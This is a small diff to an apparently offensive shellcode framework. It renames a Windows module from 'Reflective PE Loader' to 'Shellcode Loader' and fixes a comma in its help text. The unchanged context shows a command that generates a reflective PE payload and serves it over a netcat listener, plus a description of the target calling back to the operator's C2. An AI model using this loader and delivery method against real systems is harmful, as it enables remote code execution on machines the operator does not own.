@@ -23,7 +23,7 @@ class Shellcode():
 
     platform = "windows"
 
-    name = f"Windows ({arch}) Reflective PE Loader"
+    name = f"Windows ({arch}) Shellcode Loader"
 
     module = f"{platform}/{arch}/shellcode_exec_tcp"
 
@@ -45,7 +45,7 @@ class Shellcode():
                    f"    {sys.argv[0]} -p windows/x64/reflective_pe EXE=/path/doom.exe -f raw | nc -lvp 8080\n\n"
 
                    "Upon execution of the first stage, you should get a connection from the target on your"
-                   " C2. If using Netcat hit, [CTRL]+[C]. Upon doing so, your shellcode should execute in"
+                   " C2. If using Netcat, hit [CTRL]+[C]. Upon doing so, your shellcode should execute in"
                    " memory.")
 
     arguments = {}
